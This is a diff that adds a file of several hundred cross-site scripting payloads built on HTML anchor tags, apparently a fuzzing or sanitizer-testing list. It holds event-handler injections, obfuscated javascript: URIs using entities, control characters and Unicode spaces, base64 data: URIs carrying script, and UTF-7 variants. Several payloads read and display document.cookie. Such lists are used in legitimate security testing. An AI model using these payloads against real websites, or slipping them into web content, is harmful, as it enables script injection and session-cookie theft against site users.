@@ -1,0 +1,370 @@
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1571)">XXX</a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(657)">XXX</a>
+<a style="-o-link:'javascript:javascript:alert(1554)';-o-link-source:current">X
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<a style="-o-link:'javascript:javascript:alert(640)';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1558);">XXX</a></a><a href="javascript:javascript:alert(1558)">XXX</a>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(644);">XXX</a></a><a href="javascript:javascript:alert(644)">XXX</a>
+<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
+<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy="alert(1)" contenteditable>test</a>
+<a oncut="alert(1)" contenteditable>test</a>
+<a ondblclick="alert(1)">test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a/onmousemove=alert(1)//>xss
+<a onmouseout="alert(1)">test</a>
+<a onmouseover%3D"alert(1)">xss
+<a onmouseover=alert(1000)>xxs link</a>
+<a onmouseover="alert(1633)">xxs link</a>
+<a onmouseover=alert(1634)>xxs link</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseover="alert(719)">xxs link</a>
+<a onmouseover=alert(720)>xxs link</a>
+<a onmouseover="alert(999)">xxs link</a>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+<a onmouseup="alert(1)">test</a>
+<a onpaste="alert(1)" contenteditable>test</a>
+</a>//["'`-->]]>]</div>
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
++ADw-script+AD4-alert(974)+ADw-/script+AD4-
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
+a="get";
+a=\"get\";
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(1895);";)";;&#10;eval(a+b+c+d);
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
+a="get";b="URL";c="javascript:";d="alert(1771);";eval(a+b+c+d);
+a="get";b="URL";c="javascript.:";d="alert(267);";eval(a+b+c+d);
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+<a href=[0x0b]xss" onfocus=prompt(1) autofocus fragment="
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+<a href="about:<script>document.vulnerable=true;</script>">
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<;A HREF=";//google";>;XSS<;/A>;
+<A HREF="h
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<A HREF="http://66.102.7.147/">XSS</A>
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1550)></a>">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(636)></a>">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+<A HREF="http://google.com/">XSS</A>
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<A HREF="http://www.google.com./">XSS</A>
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<a href="jav&#65ascript:javascript:alert(1622)">test1622</a>
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+<a href="jav&#65ascript:javascript:alert(708)">test708</a>
+<a href="jav&#97ascript:javascript:alert(1623)">test1623</a>
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+<a href="jav&#97ascript:javascript:alert(709)">test709</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<a href=java&#1546&#2&#3&#4&#5&#6&#7&#8&#15461546&#15462script:javascript:alert(1546)>XXX</a>
+<a href=java&#632&#2&#3&#4&#5&#6&#7&#8&#632632&#6322script:javascript:alert(632)>XXX</a>
+<A href=javas%26#99;ript:alert(1)>click
+<a href="javascript:`${alert(69)}`">XSS Test</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<A href="javascript%26colon;confirm()">click
+<a href=javascript:alert(1)>click 
+<a href=javascript:alert(200)>click
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<a href="jav   ascript:alert('XSS');">Click Me</a>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<a href="javascript#document.vulnerable=true;">
+<a href="javascript:[''].findIndex(alert(71)">XSS Test</a>
+<a href="javascript:javascript:alert(1573)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="javascript:javascript:alert(659)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="javascript:(new Function('alert(80))()">XSS Test</a>
+<a href="javascript:(new (Object.getPrototypeOf(async function(){}).constructor)('alert(84))()">XSS Test</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1155)&NewLine;>X</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1692)&NewLine;>X</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(778)&NewLine;>X</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(817)&NewLine;>X</a>
+<a href="javascript\x00:javascript:alert(1385)" id="fuzzelement1385">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(486)" id="fuzzelement486">test</a>
+<a href="javascript\x09:javascript:alert(1387)" id="fuzzelement1387">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(488)" id="fuzzelement488">test</a>
+<a href="javascript\x0A:javascript:alert(1389)" id="fuzzelement1389">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(490)" id="fuzzelement490">test</a>
+<a href="javascript\x0D:javascript:alert(1388)" id="fuzzelement1388">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(489)" id="fuzzelement489">test</a>
+<a href="javascript\x3Ajavascript:alert(1263)" id="fuzzelement1263">test</a>
+<a href="javascript\x3A:javascript:alert(1386)" id="fuzzelement1386">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3Ajavascript:alert(364)" id="fuzzelement364">test</a>
+<a href="javascript\x3A:javascript:alert(487)" id="fuzzelement487">test</a>
+<a href="javas\x00cript:javascript:alert(1265)" id="fuzzelement1265">test</a>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x00cript:javascript:alert(366)" id="fuzzelement366">test</a>
+<a href="javas\x01273cript:javascript:alert(1273)" id="fuzzelement1273">test</a>
+<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:alert(1270)" id="fuzzelement1270">test</a>
+<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:alert(371)" id="fuzzelement371">test</a>
+<a href="javas\x0374cript:javascript:alert(374)" id="fuzzelement374">test</a>
+<a href="javas\x03cript:javascript:alert(1271)" id="fuzzelement1271">test</a>
+<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:alert(372)" id="fuzzelement372">test</a>
+<a href="javas\x04cript:javascript:alert(1272)" id="fuzzelement1272">test</a>
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:alert(373)" id="fuzzelement373">test</a>
+<a href="javas\x05cript:javascript:alert(1274)" id="fuzzelement1274">test</a>
+<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:alert(375)" id="fuzzelement375">test</a>
+<a href="javas\x06cript:javascript:alert(1277)" id="fuzzelement1277">test</a>
+<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:alert(378)" id="fuzzelement378">test</a>
+<a href="javas\x07cript:javascript:alert(1266)" id="fuzzelement1266">test</a>
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:alert(367)" id="fuzzelement367">test</a>
+<a href="javas\x08cript:javascript:alert(1269)" id="fuzzelement1269">test</a>
+<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:alert(370)" id="fuzzelement370">test</a>
+<a href="javas\x09cript:javascript:alert(1276)" id="fuzzelement1276">test</a>
+<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:alert(377)" id="fuzzelement377">test</a>
+<a href="javas\x0Acript:javascript:alert(1268)" id="fuzzelement1268">test</a>
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:alert(369)" id="fuzzelement369">test</a>
+<a href="javas\x0Bcript:javascript:alert(1275)" id="fuzzelement1275">test</a>
+<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:alert(376)" id="fuzzelement376">test</a>
+<a href="javas\x0Ccript:javascript:alert(1278)" id="fuzzelement1278">test</a>
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:alert(379)" id="fuzzelement379">test</a>
+<a href="javas\x0Dcript:javascript:alert(1267)" id="fuzzelement1267">test</a>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:alert(368)" id="fuzzelement368">test</a>
+<a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+<a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<A HREF="//www.google.com/">XSS</A>
+<a href="\x00javascript:javascript:alert(1347)" id="fuzzelement1347">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(448)" id="fuzzelement448">test</a>
+<a href="\x01365javascript:javascript:alert(1365)" id="fuzzelement1365">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(1377)" id="fuzzelement1377">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(478)" id="fuzzelement478">test</a>
+<a href="\x03javascript:javascript:alert(1344)" id="fuzzelement1344">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:alert(445)" id="fuzzelement445">test</a>
+<a href="\x0466javascript:javascript:alert(466)" id="fuzzelement466">test</a>
+<a href="\x04javascript:javascript:alert(1364)" id="fuzzelement1364">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(465)" id="fuzzelement465">test</a>
+<a href="\x05javascript:javascript:alert(1336)" id="fuzzelement1336">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:alert(437)" id="fuzzelement437">test</a>
+<a href="\x06javascript:javascript:alert(1379)" id="fuzzelement1379">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:alert(480)" id="fuzzelement480">test</a>
+<a href="\x07javascript:javascript:alert(1361)" id="fuzzelement1361">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:alert(462)" id="fuzzelement462">test</a>
+<a href="\x08javascript:javascript:alert(1366)" id="fuzzelement1366">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(467)" id="fuzzelement467">test</a>
+<a href="\x09javascript:javascript:alert(1352)" id="fuzzelement1352">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:alert(453)" id="fuzzelement453">test</a>
+<a href="\x0Ajavascript:javascript:alert(1372)" id="fuzzelement1372">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:alert(473)" id="fuzzelement473">test</a>
+<a href="\x0Bjavascript:javascript:alert(1333)" id="fuzzelement1333">test</a>
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Bjavascript:javascript:alert(434)" id="fuzzelement434">test</a>
+<a href="\x0Cjavascript:javascript:alert(1373)" id="fuzzelement1373">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:alert(474)" id="fuzzelement474">test</a>
+<a href="\x0Djavascript:javascript:alert(1371)" id="fuzzelement1371">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:alert(472)" id="fuzzelement472">test</a>
+<a href="\x0Ejavascript:javascript:alert(1345)" id="fuzzelement1345">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(446)" id="fuzzelement446">test</a>
+<a href="\x0Fjavascript:javascript:alert(1334)" id="fuzzelement1334">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:alert(435)" id="fuzzelement435">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x13388javascript:javascript:alert(1338)" id="fuzzelement1338">test</a>
+<a href="\x13391339javascript:javascript:alert(1339)" id="fuzzelement1339">test</a>
+<a href="\x13437javascript:javascript:alert(1343)" id="fuzzelement1343">test</a>
+<a href="\x1346Ajavascript:javascript:alert(1346)" id="fuzzelement1346">test</a>
+<a href="\x13480javascript:javascript:alert(1348)" id="fuzzelement1348">test</a>
+<a href="\x13513javascript:javascript:alert(1351)" id="fuzzelement1351">test</a>
+<a href="\x13544javascript:javascript:alert(1354)" id="fuzzelement1354">test</a>
+<a href="\x13559javascript:javascript:alert(1355)" id="fuzzelement1355">test</a>
+<a href="\x1357Fjavascript:javascript:alert(1357)" id="fuzzelement1357">test</a>
+<a href="\x1359Djavascript:javascript:alert(1359)" id="fuzzelement1359">test</a>
+<a href="\x13702javascript:javascript:alert(1370)" id="fuzzelement1370">test</a>
+<a href="\x13745javascript:javascript:alert(1374)" id="fuzzelement1374">test</a>
+<a href="\x13766javascript:javascript:alert(1376)" id="fuzzelement1376">test</a>
+<a href="\x1378Bjavascript:javascript:alert(1378)" id="fuzzelement1378">test</a>
+<a href="\x1382Ejavascript:javascript:alert(1382)" id="fuzzelement1382">test</a>
+<a href="\x1384Cjavascript:javascript:alert(1384)" id="fuzzelement1384">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(1350)" id="fuzzelement1350">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(451)" id="fuzzelement451">test</a>
+<a href="\x4398javascript:javascript:alert(439)" id="fuzzelement439">test</a>
+<a href="\x440440javascript:javascript:alert(440)" id="fuzzelement440">test</a>
+<a href="\x4447javascript:javascript:alert(444)" id="fuzzelement444">test</a>
+<a href="\x447Ajavascript:javascript:alert(447)" id="fuzzelement447">test</a>
+<a href="\x4490javascript:javascript:alert(449)" id="fuzzelement449">test</a>
+<a href="\x4523javascript:javascript:alert(452)" id="fuzzelement452">test</a>
+<a href="\x4554javascript:javascript:alert(455)" id="fuzzelement455">test</a>
+<a href="\x4569javascript:javascript:alert(456)" id="fuzzelement456">test</a>
+<a href="\x458Fjavascript:javascript:alert(458)" id="fuzzelement458">test</a>
+<a href="\x460Djavascript:javascript:alert(460)" id="fuzzelement460">test</a>
+<a href="\x4712javascript:javascript:alert(471)" id="fuzzelement471">test</a>
+<a href="\x4755javascript:javascript:alert(475)" id="fuzzelement475">test</a>
+<a href="\x4776javascript:javascript:alert(477)" id="fuzzelement477">test</a>
+<a href="\x479Bjavascript:javascript:alert(479)" id="fuzzelement479">test</a>
+<a href="\x483Ejavascript:javascript:alert(483)" id="fuzzelement483">test</a>
+<a href="\x485Cjavascript:javascript:alert(485)" id="fuzzelement485">test</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+<a href="\xC2\xA0javascript:javascript:alert(1335)" id="fuzzelement1335">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(436)" id="fuzzelement436">test</a>
+<a href="\xE1337\xA0\x8Ejavascript:javascript:alert(1337)" id="fuzzelement1337">test</a>
+<a href="\xE1362\x9A\x80javascript:javascript:alert(1362)" id="fuzzelement1362">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1342)" id="fuzzelement1342">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(443)" id="fuzzelement443">test</a>
+<a href="\xE2\x80\x81358javascript:javascript:alert(1358)" id="fuzzelement1358">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1349)" id="fuzzelement1349">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(450)" id="fuzzelement450">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1363)" id="fuzzelement1363">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(464)" id="fuzzelement464">test</a>
+<a href="\xE2\x80\x8459javascript:javascript:alert(459)" id="fuzzelement459">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1367)" id="fuzzelement1367">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(468)" id="fuzzelement468">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1381)" id="fuzzelement1381">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(482)" id="fuzzelement482">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1368)" id="fuzzelement1368">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(469)" id="fuzzelement469">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1360)" id="fuzzelement1360">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(461)" id="fuzzelement461">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1340)" id="fuzzelement1340">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(441)" id="fuzzelement441">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1341)" id="fuzzelement1341">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(442)" id="fuzzelement442">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1353)" id="fuzzelement1353">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(454)" id="fuzzelement454">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1375)" id="fuzzelement1375">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(476)" id="fuzzelement476">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1380)" id="fuzzelement1380">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
